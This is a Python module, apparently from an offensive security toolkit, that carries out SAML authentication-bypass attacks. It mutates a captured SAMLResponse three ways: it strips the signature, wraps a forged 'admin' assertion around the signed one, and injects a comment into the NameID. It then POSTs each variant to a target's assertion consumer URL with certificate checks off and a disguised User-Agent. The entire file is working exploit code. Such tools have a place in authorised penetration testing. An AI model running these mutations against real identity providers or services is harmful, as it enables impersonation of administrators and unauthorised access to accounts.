"""
Execution logic for saml_signature_bypass_probe: applies a bounded,
named set of well-known signature-bypass mutations to a real captured
SAMLResponse XML, base64-re-encodes each, and POSTs it to the SP's ACS
URL. Mutates an existing captured response -- never forges one from
nothing. No parsing here -- that's parse.py's job (XML mutation lives
here since it's indistinguishable from "building the request").
"""
from __future__ import annotations

import base64
import re
from dataclasses import dataclass, field
from typing import List, Optional
from xml.etree import ElementTree as ET

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

DEFAULT_TIMEOUT = 10

MUTATION_STRIP_SIGNATURE = "strip_signature"
MUTATION_XML_SIGNATURE_WRAPPING = "xml_signature_wrapping"
MUTATION_COMMENT_INJECTION_NAMEID = "comment_injection_nameid"
ALL_MUTATIONS = (MUTATION_STRIP_SIGNATURE, MUTATION_XML_SIGNATURE_WRAPPING, MUTATION_COMMENT_INJECTION_NAMEID)


@dataclass
class RawSamlAttempt:
    mutation: str
    status_code: int = 0
    location: str = ""
    set_cookie: bool = False
    body: str = ""
    error: Optional[str] = None
    mutation_error: Optional[str] = None


@dataclass
class RawSamlBypassResult:
    target: str = ""
    attempts: List[RawSamlAttempt] = field(default_factory=list)
    error: Optional[str] = None


def _strip_signature(xml_bytes: bytes) -> bytes:
    text = xml_bytes.decode("utf-8", errors="replace")
    stripped = re.sub(r"<ds:Signature\b.*?</ds:Signature>", "", text, flags=re.DOTALL)
    stripped = re.sub(r"<Signature\b.*?</Signature>", "", stripped, flags=re.DOTALL)
    return stripped.encode("utf-8")


def _xml_signature_wrapping(xml_bytes: bytes) -> bytes:
    """Duplicates the signed Assertion as an attacker-modified copy placed
    ahead of the original (still-signed, now-unused) copy -- a classic
    XSW shape where a naive validator checks the signature against the
    wrong (original) element but the application logic reads the first
    (attacker-modified) one."""
    text = xml_bytes.decode("utf-8", errors="replace")
    match = re.search(r"<saml2?:Assertion\b.*?</saml2?:Assertion>", text, flags=re.DOTALL)
    if not match:
        match = re.search(r"<Assertion\b.*?</Assertion>", text, flags=re.DOTALL)
    if not match:
        raise ValueError("no <Assertion> element found to wrap")

    original_assertion = match.group(0)
    forged = re.sub(
        r"(<saml2?:NameID[^>]*>)(.*?)(</saml2?:NameID>)",
        r"\1admin\3", original_assertion, count=1,
    )
    if forged == original_assertion:
        forged = re.sub(r"(<NameID[^>]*>)(.*?)(</NameID>)", r"\1admin\3", original_assertion, count=1)

    wrapped = forged + original_assertion
    return (text[: match.start()] + wrapped + text[match.end():]).encode("utf-8")


def _comment_injection_nameid(xml_bytes: bytes) -> bytes:
    text = xml_bytes.decode("utf-8", errors="replace")
    pattern = re.compile(r"(<saml2?:NameID[^>]*>)([^<]*)(</saml2?:NameID>)")
    if not pattern.search(text):
        pattern = re.compile(r"(<NameID[^>]*>)([^<]*)(</NameID>)")

    def _inject(m: "re.Match") -> str:
        return f"{m.group(1)}admin<!---->@evil-tradecraft-probe.test{m.group(3)}"

    mutated, count = pattern.subn(_inject, text, count=1)
    if count == 0:
        raise ValueError("no <NameID> element found to inject into")
    return mutated.encode("utf-8")


_MUTATORS = {
    MUTATION_STRIP_SIGNATURE: _strip_signature,
    MUTATION_XML_SIGNATURE_WRAPPING: _xml_signature_wrapping,
    MUTATION_COMMENT_INJECTION_NAMEID: _comment_injection_nameid,
}


def execute(target: str, saml_response: str, timeout: int = DEFAULT_TIMEOUT) -> RawSamlBypassResult:
    if requests is None:
        return RawSamlBypassResult(target=target, error="requests library not available")

    try:
        decoded = base64.b64decode(saml_response, validate=True)
    except Exception as exc:
        return RawSamlBypassResult(target=target, error=f"'saml_response' is not valid base64: {exc}")

    try:
        ET.fromstring(decoded)
    except ET.ParseError as exc:
        return RawSamlBypassResult(target=target, error=f"'saml_response' did not decode to well-formed XML: {exc}")

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0", "Content-Type": "application/x-www-form-urlencoded"}
    attempts: List[RawSamlAttempt] = []

    for mutation in ALL_MUTATIONS:
        try:
            mutated_xml = _MUTATORS[mutation](decoded)
        except Exception as exc:
            attempts.append(RawSamlAttempt(mutation=mutation, mutation_error=str(exc)))
            continue

        mutated_b64 = base64.b64encode(mutated_xml).decode("ascii")
        try:
            resp = requests.post(
                target, data={"SAMLResponse": mutated_b64}, headers=headers,
                timeout=timeout, verify=False, allow_redirects=False,
            )
            attempts.append(RawSamlAttempt(
                mutation=mutation, status_code=resp.status_code,
                location=resp.headers.get("location", ""),
                set_cookie=bool(resp.headers.get("set-cookie")),
                body=(resp.text or "")[:5000],
            ))
        except requests.RequestException as exc:
            attempts.append(RawSamlAttempt(mutation=mutation, error=str(exc)))
        except Exception as exc:
            attempts.append(RawSamlAttempt(mutation=mutation, error=f"{type(exc).__name__}: {exc}"))

    return RawSamlBypassResult(target=target, attempts=attempts)
